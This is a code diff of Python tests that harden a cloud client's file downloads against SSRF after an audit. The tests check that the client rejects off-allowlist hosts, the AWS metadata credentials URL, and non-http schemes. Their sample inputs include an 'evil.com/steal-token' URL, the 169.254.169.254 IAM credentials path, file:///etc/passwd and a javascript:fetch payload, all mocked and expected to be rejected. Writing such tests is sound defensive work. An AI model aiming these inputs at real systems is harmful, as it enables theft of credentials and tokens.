@@ -230,44 +230,37 @@ async def test_download_from_allowlisted_host_sends_bearer() -> None:
             await client.close()
 
 
-def _settings_with_enforce(enforce: bool):
-    """Build a fresh Settings instance with the enforce flag set.
-
-    Doesn't touch the cached module-level singleton — we pass the settings to
-    NdiCloudClient explicitly. conftest.py sets the required env vars so
-    `Settings()` picks them up from the environment.
-    """
-    from backend.config import Settings
-
-    return Settings(DOWNLOAD_ALLOWLIST_ENFORCE=enforce)  # type: ignore[call-arg]
-
-
 @pytest.mark.asyncio
-async def test_download_from_off_allowlist_host_logs_warning_phase1() -> None:
-    """Phase 1 (enforce=False): Authorization still forwarded, warning logged."""
-    captured: dict[str, str] = {}
+async def test_download_from_off_allowlist_host_hard_rejects() -> None:
+    """Audit 2026-04-23 (#49): off-allowlist host raises BinaryNotFound,
+    does NOT forward the Bearer token, and does NOT fetch the URL. This
+    closes the SSRF where a dataset could point `files.file_info.locations`
+    at internal infra and receive the bytes back as a 'binary'."""
+    from backend.errors import BinaryNotFound
 
-    def handler(request: httpx.Request) -> httpx.Response:
-        captured["authorization"] = request.headers.get("Authorization", "")
+    touched = {"fetched": False}
+
+    def handler(request: httpx.Request) -> httpx.Response:  # pragma: no cover
+        touched["fetched"] = True
         return httpx.Response(200, content=b"EVIL")
 
     with respx.mock(assert_all_called=False) as router:
         router.get("https://evil.com/steal-token").mock(side_effect=handler)
-        client = NdiCloudClient(settings=_settings_with_enforce(False))
+        client = NdiCloudClient()
         await client.start()
         try:
-            with structlog.testing.capture_logs() as logs:
-                body = await client.download_file(
+            with (
+                structlog.testing.capture_logs() as logs,
+                pytest.raises(BinaryNotFound),
+            ):
+                await client.download_file(
                     "https://evil.com/steal-token?X-Amz-Signature=SECRET",
                     access_token="jwt-abc",
                 )
-            assert body == b"EVIL"
-            # Phase-1: Authorization header STILL forwarded (we observe only).
-            assert captured["authorization"] == "Bearer jwt-abc"
+            assert touched["fetched"] is False, "must not fetch off-allowlist URL"
             events = [le for le in logs if le.get("event") == "cloud.download.off_allowlist_host"]
             assert events, f"expected off_allowlist_host warning, got {logs}"
             assert events[0]["host"] == "evil.com"
-            assert events[0]["enforce"] is False
             # url_pattern in log must NOT leak the signed-URL query.
             assert "X-Amz-Signature" not in events[0]["url_pattern"]
         finally:
@@ -275,54 +268,63 @@ async def test_download_from_off_allowlist_host_logs_warning_phase1() -> None:
 
 
 @pytest.mark.asyncio
-async def test_download_from_off_allowlist_host_strips_auth_phase2() -> None:
-    """Phase 2 (enforce=True): Authorization stripped; warning still logged."""
-    captured: dict[str, str | None] = {}
+async def test_download_metadata_ip_blocked_even_without_token() -> None:
+    """AWS metadata IP (169.254.169.254) is not on the allowlist and must be
+    hard-rejected, with or without a token. The bearer is irrelevant — what
+    matters is that we do not fetch the URL at all and relay the bytes."""
+    from backend.errors import BinaryNotFound
 
-    def handler(request: httpx.Request) -> httpx.Response:
-        captured["authorization"] = request.headers.get("Authorization")
-        return httpx.Response(200, content=b"NOT_SENT")
+    touched = {"fetched": False}
+
+    def handler(request: httpx.Request) -> httpx.Response:  # pragma: no cover
+        touched["fetched"] = True
+        return httpx.Response(200, content=b"SECRET")
 
     with respx.mock(assert_all_called=False) as router:
-        router.get("https://evil.com/steal-token").mock(side_effect=handler)
-        client = NdiCloudClient(settings=_settings_with_enforce(True))
+        router.get(
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        ).mock(side_effect=handler)
+        client = NdiCloudClient()
         await client.start()
         try:
-            with structlog.testing.capture_logs() as logs:
-                body = await client.download_file(
-                    "https://evil.com/steal-token",
-                    access_token="jwt-abc",
+            with pytest.raises(BinaryNotFound):
+                await client.download_file(
+                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                 )
-            assert body == b"NOT_SENT"
-            # Phase-2: Authorization header MUST be absent.
-            assert captured["authorization"] is None
-            events = [le for le in logs if le.get("event") == "cloud.download.off_allowlist_host"]
-            assert events, f"expected off_allowlist_host warning, got {logs}"
-            assert events[0]["enforce"] is True
+            assert touched["fetched"] is False
         finally:
             await client.close()
 
 
 @pytest.mark.asyncio
-async def test_download_without_token_on_off_allowlist_host_sends_no_auth() -> None:
-    """No token passed + non-allowlisted host: request goes out with no auth,
-    regardless of enforce flag (nothing to strip)."""
-    captured: dict[str, str | None] = {}
+async def test_download_non_http_scheme_rejected() -> None:
+    """Non-http(s) schemes (file://, gopher://, javascript:) are rejected
+    before any I/O. Defense in depth — httpx itself only supports http(s)
+    but this keeps the guarantee explicit."""
+    from backend.errors import BinaryNotFound
 
-    def handler(request: httpx.Request) -> httpx.Response:
-        captured["authorization"] = request.headers.get("Authorization")
-        return httpx.Response(200, content=b"OK")
-
-    with respx.mock(assert_all_called=False) as router:
-        router.get("https://evil.com/file").mock(side_effect=handler)
-        client = NdiCloudClient(settings=_settings_with_enforce(True))
-        await client.start()
-        try:
-            body = await client.download_file("https://evil.com/file")
-            assert body == b"OK"
-            assert captured["authorization"] is None
-        finally:
-            await client.close()
+    client = NdiCloudClient()
+    await client.start()
+    try:
+        for url in (
+            "file:///etc/passwd",
+            "gopher://evil.com/",
+            "javascript:fetch('/api/auth/me')",
+            "//no-scheme.example.com/path",
+            "",
+        ):
+            with (
+                structlog.testing.capture_logs() as logs,
+                pytest.raises(BinaryNotFound),
+            ):
+                await client.download_file(url, access_token="jwt-abc")
+            events = [
+                le for le in logs
+                if le.get("event") in {"cloud.download.invalid_scheme", "cloud.download.off_allowlist_host"}
+            ]
+            assert events, f"expected rejection log for {url!r}, got {logs}"
+    finally:
+        await client.close()
 
 
 @pytest.mark.asyncio
@@ -337,7 +339,7 @@ async def test_download_from_cloud_host_always_allowlisted() -> None:
 
     with respx.mock(assert_all_called=False) as router:
         router.get("https://api.example.test/internal/file").mock(side_effect=handler)
-        client = NdiCloudClient(settings=_settings_with_enforce(True))
+        client = NdiCloudClient()
         await client.start()
         try:
             with structlog.testing.capture_logs() as logs:
